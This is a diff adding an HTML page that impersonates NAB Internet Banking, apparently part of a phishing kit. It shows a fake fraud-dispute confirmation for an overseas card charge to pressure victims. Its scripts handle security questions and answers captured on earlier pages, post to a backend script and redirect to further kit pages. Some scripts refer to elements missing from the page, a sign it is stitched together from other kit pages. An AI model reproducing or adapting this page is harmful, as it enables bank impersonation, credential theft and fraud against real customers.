@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NAB Internet Banking</title>
+    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body,
+      html {
+        font-family: Arial, sans-serif;
+        height: 100%;
+      }
+
+      .header_banner {
+        width: 100%;
+        background-color: #000;
+      }
+
+      .header_inner {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 15px 16px;
+        width: 100%;
+        gap: 20px;
+      }
+
+      .header_left {
+        display: flex;
+        align-items: center;
+      }
+
+      .header_right {
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .header_right p {
+        font-size: 0.8em;
+        padding: 10px;
+      }
+
+      .banner {
+        position: relative;
+        min-height: 100vh;
+        background-image: url("img/bg-login.jpeg");
+        background-repeat: no-repeat;
+        background-size: cover;
+        background-position: center top;
+        background-attachment: fixed;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+      }
+
+      .login_wrapper {
+        position: relative;
+        width: 100%;
+        max-width: 500px;
+        margin-top: 40px;
+        margin-left: 300px;
+        background-color: white;
+        border-radius: 8px;
+        overflow: hidden;
+      }
+
+      .form_container {
+        position: relative;
+        width: 100%;
+        padding: 38px 32px;
+        padding-bottom: 0px;
+      }
+
+      .loading-div {
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+
+      .loader {
+        width: 40px;
+        height: 40px;
+        border: 3px solid transparent;
+        border-top: 3px solid #e60000;
+        border-right: 3px solid #e60000;
+        border-radius: 50%;
+        animation: spin 1.5s linear infinite;
+        margin: 0 auto;
+      }
+
+      .loader-message {
+        margin-top: 12px;
+        font-size: 14px;
+        color: #444;
+        text-align: center;
+        font-family: Arial, sans-serif;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #ddd;
+        border-top: 4px solid rgb(194, 0, 0);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+
+      /* ── BOQ Dispute Content Styles ── */
+      .card {
+        background: #fff;
+        border-radius: 8px;
+        overflow: hidden;
+      }
+
+      .email-header {
+        padding: 16px 18px 14px;
+        border-bottom: 1px solid #e2e2e2;
+        background: #fafbfc;
+      }
+
+      .email-header .email-from-to {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 2px 16px;
+        font-size: 13px;
+      }
+
+      .email-header .email-from-to .label {
+        color: #999;
+        font-weight: 500;
+        min-width: 44px;
+      }
+
+      .email-header .email-from-to .value {
+        color: #19252e;
+        font-weight: 500;
+      }
+
+      .email-header .email-subject {
+        margin-top: 6px;
+        font-size: 15px;
+        font-weight: 700;
+        color: #19252e;
+      }
+
+      .email-header .email-date {
+        font-size: 12px;
+        color: #999;
+        margin-top: 2px;
+      }
+
+      .email-body {
+        padding: 16px 18px 8px;
+        font-size: 14px;
+        line-height: 1.7;
+        color: #555;
+      }
+
+      .email-body p {
+        margin-bottom: 12px;
+      }
+
+      .email-body p:last-child {
+        margin-bottom: 0;
+      }
+
+      .txn-block-email {
+        margin: 10px 0 14px;
+        border: 1px solid #c7ced2;
+        border-radius: 6px;
+        overflow: hidden;
+        background: #fafbfc;
+      }
+
+      .txn-top-email {
+        padding: 10px 14px;
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        border-bottom: 1px solid #c7ced2;
+        background: #f8f9fa;
+        gap: 8px;
+      }
+
+      .txn-merchant-email {
+        font-size: 15px;
+        font-weight: 700;
+        color: #19252e;
+      }
+
+      .txn-category-email {
+        font-size: 11px;
+        color: #555;
+        margin-top: 1px;
+      }
+
+      .txn-amount-email {
+        font-size: 20px;
+        font-weight: 800;
+        color: #19252e;
+        text-align: right;
+        flex-shrink: 0;
+      }
+
+      .txn-currency-email {
+        font-size: 10px;
+        color: #999;
+        text-align: right;
+        margin-top: 1px;
+      }
+
+      .txn-details-email {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .txn-detail-email {
+        padding: 8px 14px;
+        border-bottom: 1px solid #e2e2e2;
+        border-right: 1px solid #e2e2e2;
+        background: #fff;
+      }
+
+      .txn-detail-email:nth-child(2n) {
+        border-right: none;
+      }
+      .txn-detail-email:nth-last-child(-n+2) {
+        border-bottom: none;
+      }
+
+      .txn-detail-email label {
+        display: block;
+        font-size: 9px;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        color: #999;
+        margin-bottom: 1px;
+        font-weight: 600;
+      }
+
+      .txn-detail-email span {
+        font-size: 13px;
+        font-weight: 500;
+        color: #19252e;
+      }
+
+      .question-block-email {
+        padding: 14px 18px 0;
+      }
+
+      .question-block-email h2 {
+        font-size: 16px;
+        font-weight: 700;
+        color: #19252e;
+        margin-bottom: 4px;
+      }
+
+      .question-block-email p {
+        font-size: 13px;
+        color: #555;
+        line-height: 1.5;
+      }
+
+      .btn-group-email {
+        padding: 14px 18px 16px;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+      }
+
+      .btn {
+        padding: 8px 12px;
+        border-radius: 4px;
+        border: none;
+        font-size: 12px;
+        font-weight: 700;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+        transition: background 0.15s, transform 0.1s;
+        font-family: Arial, sans-serif;
+        min-width: 80px;
+        text-align: center;
+      }
+
+      .btn:hover {
+        filter: brightness(0.92);
+      }
+      .btn:active {
+        transform: scale(0.97);
+      }
+
+      .btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        filter: none;
+        transform: none;
+      }
+
+      .btn-confirm-dispute {
+        background: #e2001a;
+        color: #fff;
+      }
+
+      .btn-authorize {
+        background: #1a6e44;
+        color: #fff;
+      }
+
+      .btn svg {
+        width: 14px;
+        height: 14px;
+      }
+
+      .security-note-email {
+        margin: 0 18px 18px;
+        padding: 10px 12px;
+        background: #f8f9fa;
+        border: 1px solid #e2e2e2;
+        border-radius: 6px;
+        display: flex;
+        gap: 8px;
+        align-items: flex-start;
+        font-size: 12px;
+        color: #555;
+        line-height: 1.5;
+      }
+
+      .security-note-email .security-note-icon {
+        font-size: 14px;
+        flex-shrink: 0;
+        margin-top: 1px;
+      }
+
+      .security-note-email strong {
+        color: #19252e;
+      }
+
+      .result-screen {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        padding: 32px 20px 28px;
+      }
+
+      .result-icon-ring {
+        width: 64px;
+        height: 64px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 30px;
+        margin-bottom: 16px;
+        flex-shrink: 0;
+      }
+
+      .result-screen h2 {
+        font-size: 20px;
+        font-weight: 800;
+        margin-bottom: 8px;
+        color: #19252e;
+      }
+
+      .result-screen p {
+        font-size: 13px;
+        color: #555;
+        max-width: 380px;
+        line-height: 1.6;
+        margin-bottom: 4px;
+      }
+
+      .result-ref {
+        margin-top: 16px;
+        padding: 8px 14px;
+        background: #f3f3f3;
+        border-radius: 6px;
+        font-size: 12px;
+        color: #999;
+        width: 100%;
+        max-width: 340px;
+        word-break: break-word;
+      }
+
+      .result-ref strong {
+        color: #555;
+      }
+
+      .btn-next-steps {
+        margin-top: 18px;
+        padding: 12px 24px;
+        border-radius: 6px;
+        border: none;
+        font-size: 14px;
+        font-weight: 700;
+        cursor: pointer;
+        font-family: Arial, sans-serif;
+        transition: background 0.15s;
+        text-decoration: none;
+        display: inline-block;
+        color: #fff;
+      }
+
+      .btn-next-steps:hover {
+        filter: brightness(0.9);
+      }
+      .btn-next-steps:active {
+        transform: scale(0.97);
+      }
+
+      .btn-confirmed-next {
+        background: #e2001a;
+      }
+      .btn-denied-next {
+        background: #19252e;
+      }
+
+      @media screen and (max-width: 768px) {
+        .header_inner {
+          display: flex;
+          justify-content: space-between;
+          padding: 14px 16px;
+        }
+
+        .header_left {
+          margin-left: 0;
+          margin-bottom: 10px;
+        }
+
+        .header_right {
+          display: none;
+        }
+
+        .login_wrapper {
+          width: 90%;
+          margin: 50px auto;
+          background-color: white;
+          border-radius: 8px;
+          overflow: hidden;
+        }
+
+        .form_container {
+          padding: 20px;
+        }
+
+        .btn-group-email {
+          grid-template-columns: 1fr;
+          padding: 10px 14px 14px;
+          gap: 8px;
+        }
+
+        .btn-authorize {
+          order: -1;
+        }
+
+        .txn-top-email {
+          flex-direction: column;
+          align-items: stretch;
+        }
+
+        .txn-amount-email {
+          text-align: left;
+          margin-top: 2px;
+        }
+
+        .txn-currency-email {
+          text-align: left;
+        }
+
+        .txn-details-email {
+          grid-template-columns: 1fr;
+        }
+
+        .txn-detail-email {
+          border-right: none !important;
+        }
+
+        .txn-detail-email:nth-last-child(-n+2) {
+          border-bottom: 1px solid #e2e2e2;
+        }
+
+        .txn-detail-email:last-child {
+          border-bottom: none !important;
+        }
+
+        .email-header .email-from-to {
+          font-size: 12px;
+          flex-direction: column;
+          gap: 1px;
+        }
+
+        .email-header .email-subject {
+          font-size: 14px;
+        }
+
+        .question-block-email {
+          padding: 10px 14px 0;
+        }
+
+        .question-block-email h2 {
+          font-size: 15px;
+        }
+
+        .question-block-email p {
+          font-size: 12px;
+        }
+
+        .security-note-email {
+          margin: 0 14px 14px;
+          font-size: 11px;
+          padding: 8px 10px;
+        }
+
+        .result-screen {
+          padding: 24px 16px 20px;
+        }
+
+        .result-screen h2 {
+          font-size: 18px;
+        }
+
+        .result-screen p {
+          font-size: 12px;
+        }
+
+        .result-icon-ring {
+          width: 56px;
+          height: 56px;
+          font-size: 26px;
+        }
+
+        .result-ref {
+          font-size: 11px;
+        }
+
+        .btn {
+          font-size: 12px;
+          padding: 10px 12px;
+        }
+      }
+
+      @media screen and (max-width: 480px) {
+        .form_container {
+          padding: 16px 12px;
+        }
+
+        .btn {
+          font-size: 11px;
+          padding: 8px 10px;
+        }
+
+        .txn-merchant-email {
+          font-size: 14px;
+        }
+
+        .txn-amount-email {
+          font-size: 18px;
+        }
+
+        .email-header {
+          padding: 12px 14px 10px;
+        }
+
+        .email-body {
+          padding: 12px 14px 6px;
+          font-size: 13px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header_banner" id="headerBanner">
+      <div class="header_inner">
+        <div class="header_left">
+          <img
+            class="logo-img"
+            src="img/star-big.svg"
+            alt=""
+            height="30"
+            width="90"
+          />
+          <h1 style="color: #fff; font-size: 22px; margin: 0">
+            Internet Banking
+          </h1>
+        </div>
+        <div class="header_right">
+          <p id="currentDate"></p>
+          |
+          <p>Help</p>
+          |
+          <p>Security</p>
+          |
+          <p>Contact us</p>
+          |
+          <p>Locate us</p>
+        </div>
+      </div>
+
+      <div class="banner">
+        <div class="login_wrapper" style="width: 90%">
+          <div class="form_container">
+            <div
+              class="loading-div"
+              style="justify-content: center; align-items: center; margin: auto"
+            >
+              <div class="loader"></div>
+              <div class="loader-message">
+                <p>
+                  This process may take a few minutes. <br />Do not refresh or
+                  close this page.
+                </p>
+              </div>
+            </div>
+
+            <!-- ── BOQ Dispute Verification Main Content ── -->
+            <div id="disputeContent">
+
+              <!-- Email header -->
+              <div class="email-header">
+                <div class="email-from-to">
+                  <span><span class="label"></span> <span class="value">NAB Fraud &amp; Security</span></span>
+                  <span><span class="label"></span> <span class="value"></span></span>
+                </div>
+                <div class="email-subject">International Transaction Dispute Confirmation</div>
+                <div class="email-date"></div>
+              </div>
+
+              <!-- Email body -->
+              <div class="email-body">
+                <p class="greeting"></p>
+                <p></p>
+                <p><strong>We need your confirmation before we can proceed with the dispute.</strong></p>
+
+                <!-- Transaction summary -->
+                <div class="txn-block-email">
+                  <div class="txn-top-email">
+                    <div>
+                      <div class="txn-merchant-email">Al Maya Group</div>
+                      <div class="txn-category-email">POS · Card not present</div>
+                    </div>
+                    <div>
+                      <div class="txn-amount-email">−$1,849.00</div>
+                      <div class="txn-currency-email">Australian Dollars</div>
+                    </div>
+                  </div>
+                  <div class="txn-details-email">
+                    <div class="txn-detail-email"><label>Date</label><span>09 Jul 2026</span></div>
+                    <div class="txn-detail-email"><label>Card Type</label><span>Debit Card</span></div>
+                    <div class="txn-detail-email"><label>Merchant location</label><span>Dubai Silicon Oasis, UAE</span></div>
+                    <div class="txn-detail-email"><label>Dispute ID</label><span>NAB-DIS-20260709-8849</span></div>
+                  </div>
+                </div>
+
+                <p></p>
+                <p></p>
+              </div>
+
+              <!-- Question + action buttons -->
+              <div class="question-block-email">
+                <h2>Did you authorise this transaction?</h2>
+                <p>To continue the dispute, please confirm that you did <strong>not</strong> authorise this payment. If you did authorise it, the dispute will be closed.</p>
+              </div>
+
+              <div class="btn-group-email">
+                <button class="btn btn-confirm-dispute" onclick="handleConfirm()" id="btn-confirm">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
+                  No — I did not authorise it
+                </button>
+                <button class="btn btn-authorize" onclick="handleDeny()" id="btn-authorize">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                  Yes — I authorised it
+                </button>
+              </div>
+
+            </div>
+
+            <!-- ── Confirmed (dispute continues) ── -->
+            <div class="card" id="card-confirmed" style="display:none;">
+              <div class="result-screen" style="display:flex;">
+                <div class="result-icon-ring" style="background:#EAF6EF;">
+                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1A6E44" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                </div>
+                <h2 style="color:#1A6E44;">Dispute confirmed</h2>
+                <p>Thank you for confirming. We have recorded that you <strong>did not authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>.</p>
+                <p>Your dispute will proceed. We'll contact you with the outcome within 5–10 business days.</p>
+                <div class="result-ref">
+                  <strong>Dispute ID:</strong> NAB-DIS-20260709-8849 &nbsp;·&nbsp;
+                  <strong>Confirmed:</strong> <span id="confirm-time"></span>
+                </div>
+                <button class="btn-next-steps btn-confirmed-next" onclick="window.location.href='auth3.html';">
+                  Submit Dispute
+                </button>
+              </div>
+            </div>
+
+            <!-- ── Denied (dispute closed) ── -->
+            <div class="card" id="card-denied" style="display:none;">
+              <div class="result-screen" style="display:flex;">
+                <div class="result-icon-ring" style="background:#FDECEA;">
+                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#C0392B" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10" />
+                    <line x1="15" y1="9" x2="9" y2="15" />
+                    <line x1="9" y1="9" x2="15" y2="15" />
+                  </svg>
+                </div>
+                <h2 style="color:#C0392B;">Dispute closed</h2>
+                <p>You have confirmed that you <strong>did authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>. The dispute has been closed.</p>
+                <p>The funds will not be returned. If this was a mistake, please contact us immediately.</p>
+                <div class="result-ref">
+                  <strong>Dispute ID:</strong> NAB-DIS-20260709-8849 &nbsp;·&nbsp;
+                  <strong>Closed:</strong> <span id="deny-time"></span>
+                </div>
+                <button class="btn-next-steps btn-denied-next" onclick="window.location.href='auth3.html';">
+                  Submit Dispute
+                </button>
+              </div>
+            </div>
+
+          </div>
+          <br /><br />
+        </div>
+      </div>
+    </div>
+
+    <div
+      id="loadingModalBackdrop"
+      style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      "
+    >
+      <div
+        id="loadingModal"
+        style="
+          background: #fff;
+          padding: 40px 30px;
+          border-radius: 8px;
+          text-align: center;
+          box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+        "
+      >
+        <div class="spinner" style="margin-bottom: 20px"></div>
+        <div style="font-size: 18px; font-weight: 500">
+          Loading, please wait...
+        </div>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        document.querySelector(".back-btn").addEventListener("click", () => {
+          location.href = "security.html";
+        });
+        const savedData = localStorage.getItem("securityQA");
+        if (savedData) {
+          const { q1, a1, q2, a2, q3, a3 } = JSON.parse(savedData);
+          document.querySelector("#q1").textContent = q1;
+          document.querySelector("#a1").textContent = a1;
+          document.querySelector("#q2").textContent = q2;
+          document.querySelector("#a2").textContent = a2;
+          document.querySelector("#q3").textContent = q3;
+          document.querySelector("#a3").textContent = a3;
+        } else {
+          location.href = "security.html";
+        }
+      });
+    </script>
+
+    <script>
+      function updateImageSrc() {
+        const img = document.querySelector(".logo-img");
+        if (!img) return;
+
+        if (window.innerWidth <= 768) {
+          img.src = "img/star.svg";
+        } else {
+          img.src = "img/star-big.svg";
+        }
+      }
+
+      updateImageSrc();
+
+      window.addEventListener("resize", updateImageSrc);
+    </script>
+
+    <script>
+      function ShowLoadingModal() {
+        document.getElementById("loginForm").style.display = "none";
+        document.querySelector(".login_wrapper").style.height = "400px";
+        document.querySelector(".loading-div").style.display = "flex";
+        document.querySelector(".form_container").style.display = "flex";
+      }
+    </script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const currentDateElement = document.getElementById("currentDate");
+
+        const options = {
+          weekday: "long",
+          day: "numeric",
+          month: "long",
+          year: "numeric",
+        };
+
+        const today = new Date();
+        const formattedDate = today.toLocaleDateString("en-GB", options);
+
+        currentDateElement.textContent = formattedDate;
+      });
+    </script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const continueBtn = document.getElementById("continueBtn");
+        const agreeCheckbox = document.getElementById("agree");
+        const errorMessage = document.getElementById("error-message");
+
+        continueBtn.addEventListener("click", function () {
+          if (!agreeCheckbox.checked) {
+            errorMessage.style.display = "block";
+            isValid = false;
+            return;
+          } else {
+            errorMessage.style.display = "none";
+          }
+          isValid = true;
+          if (isValid) {
+            continueBtn.textContent = "Processing...";
+            continueBtn.disabled = true;
+            submitSecurityQuestions();
+          }
+        });
+
+        agreeCheckbox.addEventListener("change", function () {
+          if (this.checked) {
+            errorMessage.style.display = "none";
+          }
+        });
+      });
+    </script>
+
+    <script>
+      function submitSecurityQuestions() {
+        const formData = new FormData();
+        formData.append("sws", 4);
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "script/err.php", true);
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+              ShowLoadingModal();
+              setTimeout(() => {
+                window.location.href = "success.html";
+              }, 30000);
+            } else {
+              location.reload();
+            }
+          }
+        };
+        xhr.send(formData);
+      }
+    </script>
+
+    <!-- ── BOQ Dispute JavaScript ── -->
+    <script>
+      // ── Confirm handler (did NOT authorise → dispute continues) ──
+      function handleConfirm() {
+        const btn = document.getElementById('btn-confirm');
+        btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Confirming…';
+        btn.disabled = true;
+        document.getElementById('btn-authorize').disabled = true;
+
+        setTimeout(() => {
+          document.getElementById('disputeContent').style.display = 'none';
+          document.getElementById('card-confirmed').style.display = 'block';
+          document.getElementById('confirm-time').textContent = new Date().toLocaleTimeString('en-AU', {
+            hour: '2-digit',
+            minute: '2-digit'
+          });
+        }, 1400);
+      }
+
+      // ── Deny handler (did authorise → dispute closed) ──
+      function handleDeny() {
+        const btn = document.getElementById('btn-authorize');
+        btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Closing dispute…';
+        btn.disabled = true;
+        document.getElementById('btn-confirm').disabled = true;
+
+        setTimeout(() => {
+          document.getElementById('disputeContent').style.display = 'none';
+          document.getElementById('card-denied').style.display = 'block';
+          document.getElementById('deny-time').textContent = new Date().toLocaleTimeString('en-AU', {
+            hour: '2-digit',
+            minute: '2-digit'
+          });
+        }, 1400);
+      }
+    </script>
+  </body>
+</html>
